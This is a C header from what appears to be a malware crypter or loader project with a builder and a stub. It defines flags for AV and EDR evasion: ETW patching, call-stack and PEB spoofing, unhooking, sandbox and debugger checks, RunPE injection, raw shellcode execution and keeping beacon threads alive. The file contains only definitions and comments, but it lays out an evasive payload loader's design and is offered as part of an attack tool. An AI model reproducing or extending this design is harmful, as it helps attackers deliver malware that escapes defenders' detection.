#ifndef OPSEC_FLAGS_H
#define OPSEC_FLAGS_H

/*
 * OPSEC technique flags embedded in the .rsrc metadata block.
 * Builder sets them based on CLI options; Stub reads them at runtime.
 *
 * OPSEC_FLAG_NO_TLS is the exception: it is consumed by Builder to patch
 * the TLS guard byte in stub.bin before embedding.  The Stub never reads it
 * (TLS callbacks fire before EntryPoint, before resource parsing).
 */

#define OPSEC_FLAG_NO_ETW           (1u << 0)  /* skip Opsec_PatchEtw()              */
#define OPSEC_FLAG_NO_CALLSTACK     (1u << 1)  /* skip StackSpoof_Init()/Cleanup     */
#define OPSEC_FLAG_NO_PEB           (1u << 2)  /* skip Opsec_SpoofPeb()              */
#define OPSEC_FLAG_NO_TLS           (1u << 3)  /* patch TLS guard in stub.bin        */
#define OPSEC_FLAG_MODULE_OVERLOAD  (1u << 4)  /* use NtCreateSection/NtMapView      */
                                               /* instead of LoadLibraryW stomping   */
#define OPSEC_FLAG_KEEP_ALIVE       (1u << 5)  /* ExitThread(0) instead of           */
                                               /* ExitProcess after RunPE returns —  */
                                               /* keeps beacon threads running        */

/* ── Evasion check disable flags (bits 6–16) ────────────────────────────────
 *
 * By default ALL evasion checks and the hammering delay are active.
 * Each NO_ flag disables one specific check.  EVASION_FLAG_NO_ALL disables
 * everything in one bit — useful for debugging or clean-room testing.
 *
 * Consistent with OPSEC_FLAG_NO_* pattern: features are opt-out.
 *
 * These bits occupy the same DWORD as the OPSEC flags — no metadata change.
 * Builder encodes them via --no-check-* / --no-evasion CLI options.
 * Stub reads them via opsecFlags from GetPayloadFromResource().
 * --------------------------------------------------------------------------- */
#define EVASION_FLAG_NO_HAMMER       (1u << 6)   /* skip VirtualAlloc/Free hammer    */
#define EVASION_FLAG_NO_DEBUGGER     (1u << 7)   /* skip PEB / NtQIP debugger check  */
#define EVASION_FLAG_NO_API_EMU      (1u << 8)   /* skip RtlComputeCrc32 probe       */
#define EVASION_FLAG_NO_EXEC_CTRL    (1u << 9)   /* skip "wuauctl" semaphore check   */
#define EVASION_FLAG_NO_UPTIME       (1u << 10)  /* skip < 2 min uptime check        */
#define EVASION_FLAG_NO_CPU_COUNT    (1u << 11)  /* skip < 2 CPU check               */
#define EVASION_FLAG_UNHOOK            (1u << 12)  /* unhook */
#define EVASION_FLAG_NO_SLEEP_FWD    (1u << 13)  /* skip sleep-forwarding check      */
#define EVASION_FLAG_NO_SCREEN_RES   (1u << 14)  /* skip screen resolution check     */
#define EVASION_FLAG_NO_RECENT_FILES (1u << 15)  /* skip recent-files count check    */
#define EVASION_FLAG_NO_ALL          (1u << 16)  /* disable ALL evasion at once      */

/* ── Payload format flag (bit 17) ──────────────────────────────────────────
 *
 * Set by Builder when the input file is raw shellcode (no MZ header).
 * Stub skips RunPE and instead flips the decompressed buffer RW→RX and
 * calls it directly as a void(*)(void) function pointer.
 * -------------------------------------------------------------------------- */
#define PAYLOAD_FLAG_IS_SHELLCODE    (1u << 17)  /* raw PIC shellcode, skip RunPE    */

#endif /* OPSEC_FLAGS_H */
